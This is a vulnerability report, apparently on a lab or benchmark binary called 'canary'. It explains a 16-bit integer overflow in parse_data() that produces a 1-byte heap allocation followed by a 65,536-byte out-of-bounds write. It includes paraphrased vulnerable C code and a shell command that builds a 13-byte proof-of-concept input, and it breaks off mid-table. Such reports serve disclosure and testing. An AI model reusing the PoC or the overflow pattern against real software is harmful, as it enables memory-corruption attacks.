## Summary

A 16-bit integer overflow in `parse_data()` causes a tiny heap allocation (1 byte) followed by a 65,536-byte write loop, producing a large, attacker-controlled out-of-bounds heap write. The vulnerable arithmetic is a `uint16_t` multiplication of attacker-controlled `size` and `count` fields, while the actual write loop uses the correct `uint32_t` product.

- **Binary:** `/target/bin/canary`
- **Source:** `/target/src/canary.c`
- **Function:** `parse_data`
- **Sink line:** `canary.c:101` (write)
- **Allocation line:** `canary.c:95`
- **Severity:** Critical (controllable, large heap OOB write)

## Vulnerable code (paraphrased)

```c
uint16_t size       = u16_le(payload + 0);
uint16_t count      = u16_le(payload + 2);
uint16_t alloc_size = (uint16_t)(size * count);   // 16-bit truncation
if (alloc_size == 0) alloc_size = 1;              // 1-byte allocation
uint8_t *buf = malloc(alloc_size);                // canary.c:95

uint32_t real_total = (uint32_t)size * (uint32_t)count;  // true product
for (uint32_t i = 0; i < real_total; i++)
    buf[i] = 'A';                                 // canary.c:101 — OOB write
```

With `size = 0x0100` and `count = 0x0100`:
- `alloc_size` truncates to `0`, then is forced to `1`.
- `real_total = 65536`.
- The loop writes 65,536 bytes into a 1-byte heap buffer.

## Reproduction

```bash
printf '\x43\x4e\x52\x59\x01\x01\x02\x04\x00\x00\x01\x00\x01' > /tmp/poc.bin
/target/bin/canary /tmp/poc.bin
```

13-byte PoC layout:

| Offset | Bytes              | Meaning                  |
|--------|--------------------|--------------------------|
| 0      | `43 4E 52 59`      | magic "CNRY"             